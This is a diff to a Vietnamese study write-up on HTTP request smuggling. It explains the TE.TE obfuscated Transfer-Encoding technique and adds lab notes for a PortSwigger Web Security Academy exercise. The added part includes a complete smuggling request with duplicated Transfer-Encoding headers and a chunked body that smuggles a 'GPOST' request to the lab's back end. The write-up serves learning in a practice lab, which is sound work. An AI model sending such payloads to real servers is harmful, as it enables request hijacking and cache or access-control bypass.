@@ -169,7 +169,7 @@ Transfer-Encoding
 : chunked
 ```
 
-Mỗi kỹ thuật trên đều có một sự thay đổi nhỏ so với đặc tả HTTP. Trong thực tế, mã thực hiện đặc tả giao thức hiếm khi tuân thủ tuyệt đối và các triển khai khác nhau thường sẽ chấp nhận các biến thể khác nhau so với đặc tả. Để tìm ra lỗ hổng TE.TE, cần phải xác định một biến thể của header Transfer-Encoding sao cho chỉ một trong hai máy chủ phía trước hoặc phía sau xử lý nó, trong khi máy chủ còn lại bỏ qua.
+Mỗi kỹ thuật trên đều có một sự thay đổi nhỏ so với đặc tả HTTP. Trong thực tế, mã thực hiện đặc tả giao thức hiếm khi tuân thủ tuyệt đối và các triển khai khác nhau thường sẽ chấp nhận các biến thể khác nhau so với đặc tả. Để tìm ra lỗ hổng TE.TE, cần phải xác định một biến thể của header `Transfer-Encoding sao` cho chỉ một trong hai máy chủ phía trước hoặc phía sau xử lý nó, trong khi máy chủ còn lại bỏ qua.
 
 Tùy thuộc vào việc máy chủ phía trước hay phía sau có thể bị làm cho không xử lý header Transfer-Encoding bị làm nhiễu, phần còn lại của cuộc tấn công sẽ giống với các lỗ hổng CL.TE hoặc TE.CL đã được mô tả trước đó.
 
@@ -179,6 +179,28 @@ Tùy thuộc vào việc máy chủ phía trước hay phía sau có thể bị 
 https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header
 
 Mục tiêu: đánh lừa back-end request `GPOST`
+
+Dùng scan active của Burp ta thấy có phát hiện ra HTTP request smuggling:|
+![alt text](image-10.png)
+
+Dựa vào đó phát triển thêm payload: 
+```http
+POST / HTTP/1.1
+Host: 0aff0076033d41ac81630d0d000900a1.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Transfer-Encoding: chunked
+Transfer-Encoding: xhwSx3hB
+Content-Length: 4
+
+5c
+GPOST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+
+```
 
 
 
